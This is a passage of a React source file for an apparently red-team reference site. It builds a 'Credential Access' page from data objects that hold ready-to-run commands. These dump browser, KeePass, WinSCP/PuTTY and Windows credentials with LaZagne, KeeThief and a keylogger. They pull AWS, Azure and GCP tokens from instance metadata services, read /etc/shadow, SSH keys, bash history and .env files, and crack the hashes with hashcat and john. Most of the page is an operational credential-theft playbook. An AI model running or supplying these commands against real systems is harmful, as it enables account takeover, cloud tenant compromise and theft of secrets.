execute-assembly /tools/LaZagne.exe all           # All modules
execute-assembly /tools/LaZagne.exe browsers      # All browsers
execute-assembly /tools/LaZagne.exe windows       # Windows credential stores
execute-assembly /tools/LaZagne.exe databases     # Database connections
execute-assembly /tools/LaZagne.exe sysadmin      # Admin tools (WinSCP, Putty, FileZilla)
execute-assembly /tools/LaZagne.exe git           # Git credentials

# --- KEEPASS ---
# If KeePass database is open — dump master key from memory
# KeeThief: https://github.com/GhostPack/KeeThief
execute-assembly /tools/KeeThief.exe -PassThru    # Extracts composite key from memory

# Monitor KeePass for unlock (keylogger on it specifically):
keylogger <KEEPASS_PID>

# Dump .kdbx file for offline cracking:
shell dir /s /b C:\\ 2>nul | findstr /i "\.kdbx$"
# Crack with hashcat:
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# --- SESSION COOKIES (cookie hijacking) ---
# After SharpChrome cookie dump, import into browser:
# Chrome: EditThisCookie extension or Selenium automation
# Copy-paste cookie JSON into DevTools Console:
# document.cookie = "session=VALUE; domain=.example.com; path=/"

# --- WINSCP / PUTTY SESSION DATA ---
reg query "HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions" /s
# Password stored encrypted in registry — decrypt with WinSCP password recovery tools
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s
# Find PPK private key files:
shell dir /s /b C:\\ 2>nul | findstr /i "\.ppk$"`
      }
    ]
  },
  {
    id: 'cloud-creds',
    title: 'Cloud Credential Harvesting',
    subtitle: 'Extract AWS, Azure, and GCP credentials from compromised endpoints and EC2/VM instances',
    tags: ['AWS keys', 'Azure tokens', 'GCP service accounts', 'IMDS', 'metadata service', 'cloud credentials', 'S3', 'MSI'],
    accentColor: 'green',
    overview: `Cloud credentials on compromised endpoints represent high-value pivot points — an AWS access key with broad permissions or an Azure Managed Identity with Contributor role can compromise entire cloud tenants.

Key sources:
1. IMDS (Instance Metadata Service): EC2/Azure VM/GCP instances have a metadata endpoint at 169.254.169.254 — temporary credentials for the assigned IAM role accessible without authentication from within the instance
2. Environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AZURE_CLIENT_SECRET set in CI/CD agents, Docker containers, and developer workstations
3. Config files: ~/.aws/credentials, ~/.azure/, ~/.config/gcloud/credentials.db, service account JSON files
4. Source code and secrets: hardcoded in .env files, config.yml, Terraform state files, git history`,
    steps: [
      'Check IMDS endpoint (169.254.169.254) — if on an EC2/Azure/GCP instance, free credentials available',
      'Enumerate environment variables for cloud keys — often set in CI/CD agent processes',
      'Search filesystem for credential files: ~/.aws, ~/.azure, service_account.json, .env',
      'Search git history and source code for hardcoded credentials',
      'Once you have cloud credentials, use aws/az/gcloud CLI to enumerate permissions and access data',
    ],
    commands: [
      {
        title: 'Cloud credential extraction and validation',
        code: `# --- AWS INSTANCE METADATA SERVICE (IMDS) ---
# Check if running on EC2 (IMDSv1 — no token needed):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Get role name, then request credentials:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# Returns: AccessKeyId, SecretAccessKey, Token (temporary STS credentials)

# IMDSv2 (requires token):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Windows EC2 equivalent:
Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -UseBasicParsing

# --- AZURE IMDS + MANAGED IDENTITY ---
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns: access_token, token_type, expires_in

# Use token to enumerate Azure resources:
$token = "ACCESS_TOKEN_HERE"
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers @{Authorization="Bearer $token"}

# GCP metadata service:
curl -H "Metadata-Flavor:Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# --- LOCAL CREDENTIAL FILES ---
# AWS
type %USERPROFILE%\\.aws\\credentials 2>nul
cat ~/.aws/credentials
cat ~/.aws/config

# Azure
dir "%USERPROFILE%\\.azure\\" /s /b
cat ~/.azure/msal_token_cache.json
cat ~/.azure/azureProfile.json

# GCP service account files
dir /s /b C:\\ 2>nul | findstr /i "service.account.json\|credentials.json"
find / -name "*.json" 2>/dev/null | xargs grep -l "client_secret\|private_key_id" 2>/dev/null

# --- ENVIRONMENT VARIABLE SCAN ---
shell set | findstr /i "AWS SECRET KEY TOKEN AZURE GCP"
shell powershell -c "Get-ChildItem Env: | Where-Object { $_.Name -match 'AWS|AZURE|GCP|SECRET|TOKEN|KEY' }"

# --- SOURCE CODE / GIT ---
# Search git history for secrets:
git log -p | grep -i "aws_access\|aws_secret\|password\|token\|private_key" | head -50
# Or use truffleHog:
trufflehog filesystem /path/to/repo --only-verified

# --- VALIDATE AND ENUMERATE ---
# AWS — test credentials and enum permissions
aws sts get-caller-identity                    # Who are we?
aws iam list-attached-user-policies --user-name USER
aws s3 ls                                      # List accessible buckets
aws secretsmanager list-secrets                # Check Secrets Manager
aws ssm describe-parameters                   # SSM Parameter Store

# Azure — validate token
az account list
az role assignment list --assignee $(az ad signed-in-user show --query objectId -o tsv)`
      }
    ]
  },
];

const linuxCreds = [
  {
    id: 'linux-creds',
    title: 'Linux Credential Access',
    subtitle: 'Extract credentials from Linux systems: shadow file, SSH keys, config files, bash history',
    tags: ['/etc/shadow', 'SSH private key', 'bash_history', '.env', 'keyring', 'credential files'],
    accentColor: 'green',
    overview: 'Linux systems store credentials across multiple locations — /etc/shadow (hashed passwords, root-readable only), SSH private keys (~/.ssh/), shell history files (commands often include passwords passed as arguments), environment files (.env, wp-config.php, database.yml), and the GNOME Keyring. LaZagne automates credential extraction from browsers, SSH configs, and application credential stores. Mimipenguin dumps credentials from memory of running processes (browsers, mail clients).',
    steps: [
      '/etc/shadow: contains hashed passwords — readable only by root; dump and crack with hashcat/john',
      'SSH private keys: check ~/.ssh/id_rsa and /root/.ssh — may be unencrypted or weakly passphrase-protected',
      'Bash history: users type passwords in commands — check .bash_history, .zsh_history, .history',
      'Environment files: .env, config.yml, database.yml, wp-config.php often contain plaintext credentials',
      'GNOME Keyring / libsecret: stores saved credentials — query via secret-tool if running as that user',
      'Memory: mimipenguin or LaZagne dump credentials from Linux process memory (browsers, mail clients)',
    ],
    commands: [
      {
        title: 'Linux credential extraction',
        code: `# Shadow file (requires root)
cat /etc/shadow
# Format: user:$6$salt$hash: — $6$ = SHA-512
# Crack with hashcat:
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
# or john:
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# SSH private keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null
# Try to use directly:
ssh -i id_rsa user@TARGET
# Crack SSH key passphrase:
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash

# Bash history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
# Search for passwords in history
grep -i "pass\|password\|secret\|token\|key" ~/.bash_history

# Config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|token" 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
find / -name "database.yml" 2>/dev/null | xargs cat 2>/dev/null

# LaZagne — multi-platform credential dumper
python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sshkeys

# mimipenguin — dump credentials from memory (root)
python3 mimipenguin.py
bash mimipenguin.sh

# GNOME Keyring credentials
secret-tool search --all username ""
dbus-send --print-reply --dest=org.gnome.keyring /org/gnome/keyring/daemon \
  org.gnome.keyring.Daemon.GetSocketPath`
      }
    ]
  },
];

export default function CredentialAccess() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Credential </span><span className="text-orange-400">Access</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Mimikatz • NTLM PTH • Kerberos Tickets • DCSync • Responder • Kerberoasting • Password Cracking</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {[
          // SECRETS
          ...linuxCreds,          // linux-creds
          ...advancedCreds.filter(t => t.id === 'browser-creds'),
          ...advancedCreds.filter(t => t.id === 'cloud-creds'),
          // MEMORY DUMPS
          ...techniques.filter(t => t.id === 'mimikatz'),
          ...techniques.filter(t => t.id === 'ntlm'),
          ...advancedCreds.filter(t => t.id === 'responder'),
          // KERBEROS & AD
          ...techniques.filter(t => t.id === 'kerb-tickets'),
          ...advancedCreds.filter(t => t.id === 'kerberoasting'),
          ...advancedCreds.filter(t => t.id === 'asrep'),
          ...techniques.filter(t => t.id === 'dcsync'),
          // OFFLINE CRACKING
          ...techniques.filter(t => t.id === 'cracking'),
          ...techniques.filter(t => t.id === 'dcc'),
        ].map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}